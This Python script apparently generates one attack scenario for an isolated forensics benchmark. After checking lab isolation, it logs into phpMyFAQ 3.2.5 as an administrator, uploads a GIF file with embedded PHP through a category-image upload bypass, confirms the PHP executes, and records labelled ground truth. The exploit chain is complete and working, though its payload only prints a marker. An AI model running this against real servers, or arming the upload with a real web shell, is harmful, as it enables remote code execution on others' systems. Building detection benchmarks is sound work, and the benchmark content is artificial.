"""Record the isolated phpMyFAQ category-image upload-bypass scenario."""

from __future__ import annotations

import json
import os
import socket
import sys
import time
from datetime import UTC, datetime
from hashlib import sha256
from html.parser import HTMLParser
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
EXECUTION_MARKER = "M8V2-S04-EXECUTION-CHECK"


class Inputs(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.values: dict[str, str] = {}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag != "input":
            return
        fields = dict(attrs)
        name = fields.get("name")
        if name:
            self.values[name] = fields.get("value") or ""


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(9000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    headers = {
        "X-Lab-Client-IP": ATTACKER_IP,
        "User-Agent": "M8-v2-phpMyFAQ-s04",
    }
    session = requests.Session()
    steps: list[dict[str, object]] = []

    def marked_get(step_id: str, path: str, expected: bool) -> requests.Response:
        response = session.get(
            f"{EDGE}{path}",
            headers={**headers, "X-Lab-Step": step_id},
            timeout=15,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance" if not expected else "valid_account_access",
                "mitre": ["T1595"] if not expected else ["T1078"],
                "label_method": "header",
                "expected_in_timeline": expected,
            }
        )
        return response

    home = marked_get("site_check", "/", False)
    if home.status_code != 200:
        raise RuntimeError(f"site check returned HTTP {home.status_code}")

    admin_probe = marked_get("category_admin_probe", "/admin/index.php?action=addcategory", False)
    if admin_probe.status_code != 200:
        raise RuntimeError("category editor probe did not reach the login or editor page")

    login = session.post(
        f"{EDGE}/admin/index.php",
        headers={**headers, "X-Lab-Step": "editor_login"},
        data={
            "faqusername": os.environ["BENCH_ADMIN_USER"],
            "faqpassword": os.environ["BENCH_ADMIN_PASSWORD"],
            "redirect-action": "addcategory",
        },
        timeout=15,
        allow_redirects=False,
    )
    if login.status_code != 200 or not session.cookies.get("PHPSESSID"):
        raise RuntimeError(f"editor login failed (HTTP {login.status_code})")
    steps.append(
        {
            "id": "editor_login",
            "category": "valid_account_access",
            "mitre": ["T1078"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )

    form = marked_get("category_editor_open", "/admin/index.php?action=addcategory", True)
    parser = Inputs()
    parser.feed(form.text)
    if form.status_code != 200 or not parser.values.get("pmf-csrf-token"):
        raise RuntimeError("authenticated category form or CSRF token did not load")

    before = {path.name for path in Path("/app-webroot/images").iterdir() if path.is_file()}
    fields = {
        **parser.values,
        "csrf": parser.values["pmf-csrf-token"],
        "lang": ".php.",
        "parent_id": "0",
        "name": "Benchmark category s04",
        "description": "Isolated upload validation record",
        "active": "1",
        "show_home": "1",
        "user_id": "1",
        "group_id": "-1",
        "grouppermission": "all",
        "userpermission": "all",
    }
    gif_header = (
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
        b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
        b"\x00\x02\x02D\x01\x00"
    )
    probe_code = f"<?php echo '{EXECUTION_MARKER}'; ?>".encode("ascii")
    fake_gif = gif_header + b"!\xfe" + bytes([len(probe_code)]) + probe_code + b"\x00;\n"
    cookie_header = "; ".join(f"{cookie.name}={cookie.value}" for cookie in session.cookies)
    response = session.post(
        f"{EDGE}/admin/index.php?action=savecategory",
        headers={**headers, "X-Lab-Step": "category_image_upload", "Cookie": cookie_header},
        data=fields,
        files={"image": ("category.gif", fake_gif, "image/gif2")},
        timeout=30,
        allow_redirects=False,
    )
    if response.status_code != 200:
        raise RuntimeError(f"category image upload returned HTTP {response.status_code}")
    steps.append(
        {
            "id": "category_image_upload",
            "category": "unrestricted_upload",
            "mitre": ["T1190"],
            "label_method": "header",
            "expected_in_timeline": True,
        }
    )

    created = sorted(
        path.name
        for path in Path("/app-webroot/images").iterdir()
        if path.is_file() and path.name not in before
    )
    if len(created) != 1:
        raise RuntimeError(f"upload created {len(created)} new category image files")
    uploaded_path = f"/images/{created[0]}"
    execution = marked_get("uploaded_file_execution", uploaded_path, True)
    if execution.status_code != 200 or EXECUTION_MARKER not in execution.text:
        raise RuntimeError(
            f"uploaded file execution check failed (HTTP {execution.status_code})"
        )
    steps[-1]["category"] = "remote_code_execution"
    steps[-1]["mitre"] = ["T1059.004"]

    code_file = Path("/app-webroot/src/phpMyFAQ/Category/CategoryImage.php")
    if not code_file.is_file():
        raise RuntimeError("phpMyFAQ vulnerable CategoryImage source is missing")
    code_sha256 = sha256(code_file.read_bytes()).hexdigest()
    setup_path = Path("/replay/setup-complete.json")
    setup_path.write_text(
        json.dumps(
            {
                "application": "phpMyFAQ 3.2.5",
                "database": "PostgreSQL",
                "category_image_upload_test": "PASS",
                "execution_marker_confirmed": True,
                "vulnerable_source_sha256": code_sha256,
                "vulnerable_source_line": 124,
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    records = {
        "scenario_id": "s04",
        "description": (
            "An authenticated phpMyFAQ administrator opens the category editor, submits "
            "an image whose declared upload type bypasses the category-image extension "
            "mapping, and confirms that the saved PHP file executes a fixed text marker."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "category_image_upload",
        "steps": steps,
        "files": [
            {
                "path": f"/images/{created[0]}",
                "role": "attacker_file",
                "expected_in_report": True,
            },
            {
                "path": f"/data/tracking{datetime.now(UTC).strftime('%d%m%Y')}",
                "role": "application_runtime_data",
                "expected_in_report": True,
            },
        ],
        "vulnerable_code": {
            "file": "phpmyfaq/src/phpMyFAQ/Category/CategoryImage.php",
            "line": 124,
            "sha256": code_sha256,
            "vuln_class": "unrestricted_file_upload",
            "advisory_url": "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-pwh2-fpfr-x5gf",
        },
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    continuation.write_text("continue\n", encoding="ascii")
    print(
        json.dumps(
            {
                "attack_completed": True,
                "steps": len(steps),
                "uploaded_file_execution": True,
            },
            sort_keys=True,
        )
    )


def main() -> None:
    if len(sys.argv) != 2 or sys.argv[1] not in {"isolation", "attack"}:
        raise SystemExit("usage: s04.py isolation|attack")
    if sys.argv[1] == "isolation":
        isolate()
    else:
        attack()


if __name__ == "__main__":
    main()
